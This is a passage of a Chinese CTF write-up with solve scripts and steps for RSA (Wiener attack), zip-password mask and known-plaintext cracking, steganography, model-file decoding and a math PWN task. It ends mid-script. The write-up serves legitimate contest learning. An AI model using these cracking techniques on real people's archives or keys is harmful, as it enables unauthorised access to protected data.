operator\">//</span>k               <span class=\"token comment\">#这个结果就是 φ(n)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        px<span class=\"token punctuation\">,</span>qy<span class=\"token operator\">=</span>get_pq<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>n<span class=\"token operator\">-</span>phi<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">if</span> px<span class=\"token operator\">*</span>qy<span class=\"token operator\">==</span>n<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            pp<span class=\"token punctuation\">,</span>qq<span class=\"token operator\">=</span><span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>px<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>qy<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            flag <span class=\"token operator\">=</span> <span class=\"token string\">\"qsnctf&#123;\"</span> <span class=\"token operator\">+</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>gmpy2<span class=\"token punctuation\">.</span>isqrt<span class=\"token punctuation\">(</span>qq<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> gmpy2<span class=\"token punctuation\">.</span>isqrt<span class=\"token punctuation\">(</span>pp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"&#125;\"</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            <span class=\"token comment\">#print(flag)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token keyword\">return</span> flag</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"该方法不适用\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"46\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">4602579741478096718172697218991734057017874575484294836043557658035277770732473025335441717904100009903832353915404911860888652406859201203199117870443451616457858224082143505393843596092945634675849883286107358454466242110831071552006337406116884147391687266536283395576632885877802269157970812862013700574069981471342712011889330292259696760297157958521276388120468220050600419562910879539594831789625596079773163447643235584124521162320450208920533174722239029506505492660271016917768383199286913178821124229554263149007237679675898370759082438533535303763664408320263258144488534391712835778283152436277295861859</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">78665180675705390001452176028555030916759695827388719494705803822699938653475348982551790040292552032924503104351703419136483078949363470430486531014134503794074329285351511023863461560882297331218446027873891885693166833003633460113924956936552466354566559741886902240131031116897293107970411780310764816053</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>flag <span class=\"token operator\">=</span> wienerAttack<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>n<span class=\"token operator\">*</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\"># qsnctf&#123;8072e8b2982bc729cc74ef58f1abc862&#125;</span></pre></td></tr></table></figure><h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> MISC</h2>\n<h3 id=\"ctfer-revenge\"><a class=\"markdownIt-Anchor\" href=\"#ctfer-revenge\">#</a> CTFer Revenge</h3>\n<p>给了 hex 文件结构，直接先提取数据</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>input_filename <span class=\"token operator\">=</span> <span class=\"token string\">'1.txt'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>output_filename <span class=\"token operator\">=</span> <span class=\"token string\">'output_filename.zip'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>input_filename<span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    hex_data <span class=\"token operator\">=</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary_data <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token keyword\">match</span> <span class=\"token keyword\">in</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">r'([0-9a-fA-F]&#123;2&#125;(?: [0-9a-fA-F]&#123;2&#125;)+)'</span><span class=\"token punctuation\">,</span> hex_data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    binary_data<span class=\"token punctuation\">.</span>extend<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">.</span>fromhex<span class=\"token punctuation\">(</span><span class=\"token keyword\">match</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>output_filename<span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> binary_file<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    binary_file<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>binary_data<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>得到的文件是一个进行逆置的压缩包形式</p>\n<p>可以使用 puzzlesolve 解决了</p>\n<p>得到里面有密码格式，所以去进行掩码攻击了</p>\n<p><img data-src=\"/img/qsnctf_round1/image-20240301170538073.png\" alt=\"image-20240301170538073\"></p>\n<blockquote b414e3e3a6449ddba0997db259203eb7=\"\">\n<p>qsnctf</p>\n</blockquote>\n<h3 id=\"多情\"><a class=\"markdownIt-Anchor\" href=\"#多情\">#</a> 多情</h3>\n<p>里面有张图片，文件尾藏了另一张图片</p>\n<p>提出来之后进行改宽高，得到下面 996 字符</p>\n<p>进行转换二进制后</p>\n<blockquote>\n<p>1111100100</p>\n</blockquote>\n<p>根据修改时间排序也可以得到 flag 的，根据上面的和文件名也能得到 flag</p>\n<p>不得不讲这题太抽象了（</p>\n<blockquote>\n<p>bv2 0</p>\n<p>bn 0</p>\n<p>QS 0</p>\n<p>Nh 0</p>\n</blockquote>\n<blockquote>\n<p>Lr 1</p>\n<p>p5 1</p>\n<p>mJ 1</p>\n<p>cd 1</p>\n<p>Eb 1</p>\n<p>f6H 1</p>\n<p>Lrp5mJcdEbbv2bnf6HQSNh 包上 qsnctf 即可</p>\n</blockquote>\n<blockquote Lrp5mJcdEbbv2bnf6HQSNh=\"\">\n<p>os: (为啥不讲结果包上 qsnctf？？</p>\n<p>qnsctf</p>\n</blockquote>\n<h3 id=\"小光的答案之书\"><a class=\"markdownIt-Anchor\" href=\"#小光的答案之书\">#</a> 小光的答案之书</h3>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMucXNuY3RmLmNvbS90aHJlYWQtNTMzLTEtMS5odG1s\">小光的答案之书</span></p>\n</blockquote>\n<p>下面有张图，图上编码图是圣堂武士密码</p>\n<p>得到密钥 life</p>\n<blockquote>\n<p>关注公众号：中学生 CTF，关键词：青少年 CTF2024</p>\n</blockquote>\n<blockquote 49e7bd5efe114cd2d93ef60ddb2f8714=\"\">\n<p>qsnctf</p>\n</blockquote>\n<h3 id=\"ez_model\"><a class=\"markdownIt-Anchor\" href=\"#ez_model\">#</a> ez_model</h3>\n<blockquote>\n<p>.<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT1wdGgmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw\">pth</span> 文件通常是 PyTorch 中用于保存模型权重（state_dict）的文件格式。在 PyTorch 中， <code>.pth</code>  <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTYlOTYlODclRTQlQkIlQjYmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw\">文件</span>包含了模型在训练过程中学到的权重参数。这样的文件可以通过 PyTorch 提供的加载机制重新装载到相同或者相似结构的模型中，从而继续训练或者进行推理。</p>\n</blockquote>\n<p>用 python 读取内容即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> torch</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>pthfile <span class=\"token operator\">=</span> <span class=\"token string\">r'G:\\sictf\\123\\easy.pth'</span>  <span class=\"token comment\"># .pth 文件的路径</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>model <span class=\"token operator\">=</span> torch<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span>pthfile<span class=\"token punctuation\">,</span> torch<span class=\"token punctuation\">.</span>device<span class=\"token punctuation\">(</span><span class=\"token string\">'cpu'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 设置在 cpu 环境下查询</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'type:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>model<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 查看模型字典长度</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'length:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>model<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'key:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> model<span class=\"token punctuation\">.</span>keys<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 查看模型字典里面的 key</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'value:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> model<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 查看模型字典里面的 value</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span> model<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>flag tensor([ 76., 105., 100.,  85.,  74.,  51., 102.,  81.,  77.,  50.,  70.,  86.,<br>\n74., 111., 120., 112.,  68., 119.,  76., 118.,  68., 121.,  70.,  51.,<br>\n68., 119., 112.,  80., 100., 119., 120.,  79.,  69., 103.,  98.,  81.,<br>\n74., 111., 120., 110.,  69., 103., 100., 110.,  74., 103., 110., 111.,<br>\n106., 111.,  90.,  53., 109.,  70.])<br>\nhint tensor([ 90., 122.,  89., 121.,  88., 120.,  65.,  97.,  66.,  98.,  67.,  99.,<br>\n68., 100.,  69., 101.,  70., 102.,  71., 103.,  72., 104.,  73., 105.,<br>\n74., 106.,  75., 107.,  76., 108.,  77., 109.,  78., 110.,  79., 111.,<br>\n80., 112.,  81., 113.,  82., 114.,  83., 115.,  84., 116.,  85., 117.,<br>\n86., 118.,  87., 119.,  48.,  49.,  50.,  51.,  52.,  53.,  54.,  55.,<br>\n56.,  57.,  43.,  47.])</p>\n</blockquote>\n<p>整理一下</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> binascii</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>flag <span class=\"token operator\">=</span><span class=\"token punctuation\">[</span> <span class=\"token number\">76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">105</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">85</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">74</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">51</span><span class=\"token punctuation\">,</span> <span class=\"token number\">102</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">81</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">77</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">50</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">70</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">86</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>         <span class=\"token number\">74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">111</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">112</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">119</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">118</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">121</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">70</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">51</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>         <span class=\"token number\">68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">119</span><span class=\"token punctuation\">,</span> <span class=\"token number\">112</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">119</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">79</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">103</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">98</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">81</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>         <span class=\"token number\">74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">111</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">103</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">103</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span> <span class=\"token number\">111</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token number\">106</span><span class=\"token punctuation\">,</span> <span class=\"token number\">111</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">90</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">109</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">70</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>hint <span class=\"token operator\">=</span><span class=\"token punctuation\">[</span> <span class=\"token number\">90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">122</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">89</span><span class=\"token punctuation\">,</span> <span class=\"token number\">121</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">65</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">97</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">66</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">98</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">67</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">99</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>         <span class=\"token number\">68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">101</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">102</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">71</span><span class=\"token punctuation\">,</span> <span class=\"token number\">103</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">104</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">105</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>         <span class=\"token number\">74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">106</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">107</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">108</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">77</span><span class=\"token punctuation\">,</span> <span class=\"token number\">109</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">111</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>         <span class=\"token number\">80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">112</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">113</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">114</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">83</span><span class=\"token punctuation\">,</span> <span class=\"token number\">115</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">84</span><span class=\"token punctuation\">,</span> <span class=\"token number\">116</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">117</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>         <span class=\"token number\">86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">118</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">119</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">48</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">49</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">50</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">51</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">52</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">53</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">54</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">55</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>         <span class=\"token number\">56</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">57</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">43</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">47</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    s<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>s1 <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>k <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>hint<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    k<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>hint<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>k1 <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>tableBase64 <span class=\"token operator\">=</span> <span class=\"token string\">\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>translated_s1 <span class=\"token operator\">=</span> s1<span class=\"token punctuation\">.</span>translate<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>maketrans<span class=\"token punctuation\">(</span>k1<span class=\"token punctuation\">,</span> tableBase64<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># 为了处理填充问题，计算缺少的填充字符数量</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>translated_s1<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">if</span> padding <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 如果不是 4 的倍数，添加缺少的 '='</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    translated_s1 <span class=\"token operator\">+=</span> <span class=\"token string\">\"=\"</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token operator\">-</span> padding<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>b’qsnctf{d0b1e37104739d71b92fb1a93aa8cf09}’</p>\n</blockquote>\n<h3 id=\"追光者\"><a class=\"markdownIt-Anchor\" href=\"#追光者\">#</a> 追光者</h3>\n<p>第一层压缩包是伪加密，winrar 修复压缩包后即可正常解压。</p>\n<p>formost 分离  <code>追光者.jpg</code>  ，得到一个压缩包。</p>\n<p>压缩包的注释</p>\n<pre><code>人们不愿意相信光是AB，人们更愿意相信光是AD。人们也不愿意相信，密码就在眼前，因为人们只愿相信自己愿意相信的，只愿看到自己想看到的……\n</code></pre>\n<p>用 winhex 打开 <code>追光者.jpg</code>  ，在  <code>追光者.jpg</code>  底部得到一个 hint（开始骂人）</p>\n<pre><code>提示：密码中的字符全为小写\n</code></pre>\n<p>搜  <code>JFIF</code>  发现另一个图片，formost 没把它分离出来。</p>\n<p><img data-src=\"/img/qsnctf_round1/m_1_1.png\" alt=\"m_1_1\"></p>\n<p>根据压缩包注释的提示，搜索  <code>AB</code>  ，高亮后可以看到密码</p>\n<p><img data-src=\"/img/qsnctf_round1/m_1_2.png\" alt=\"m_1_2\"></p>\n<p>抄写下来，得到</p>\n<pre><code>iamsthplay\n</code></pre>\n<p>但是这个密码不对！需要在后边加上 <code>er</code> ，而且还要把 <code>s</code>  改成 <code>5</code> 。（说好的 <code>密码中的字符全为小写</code> 呢？）</p>\n<pre><code>iam5thplayer\n</code></pre>\n<p>解压后，在 <code>txt</code>  文件里得到 flag 的前半段。</p>\n<p>发现新的压缩包里也有一个 <code>闪.jpg</code> ，明文爆破得到密码</p>\n<pre><code>G3r1ing!\n</code></pre>\n<p><img data-src=\"/img/qsnctf_round1/m_1_3.png\" alt=\"m_1_3\"></p>\n<p>解压后得到 flag 后半段的逆序，逆回来拼上前半段即可</p>\n<blockquote NE73R_G1V3_U1o=\"\">\n<p>qsnctf</p>\n</blockquote>\n<h3 id=\"问卷\"><a class=\"markdownIt-Anchor\" href=\"#问卷\">#</a> 问卷</h3>\n<p>擂台赛下次明白了哈</p>\n<blockquote 青少年CTF蒸蒸日上=\"\">\n<p>qsnctf</p>\n</blockquote>\n<h2 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> PWN</h2>\n<h3 id=\"简单的数学题\"><a class=\"markdownIt-Anchor\" href=\"#简单的数学题\">#</a> 简单的数学题</h3>\n<blockquote da7787a8574e41f4807613358d77610a=\"\">\n<p>└─$ nc <span class=\"exturl\" data-url=\"aHR0cDovL2NoYWxsZW5nZS5xc25jdGYuY29t\">challenge.qsnctf.com</span> 30171<br>\n[*]Welcome! Please solve an equation.<br>\n[*]Challenge 1: 2*15^2-1/x+15-6=458.875 Please tell me the result of x.</p>\n<p>8</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> sympy <span class=\"token keyword\">import</span> symbols<span class=\"token punctuation\">,</span> Eq<span class=\"token punctuation\">,</span> solve</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>x <span class=\"token operator\">=</span> symbols<span class=\"token punctuation\">(</span><span class=\"token string\">'x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>equation <span class=\"token operator\">=</span> Eq<span 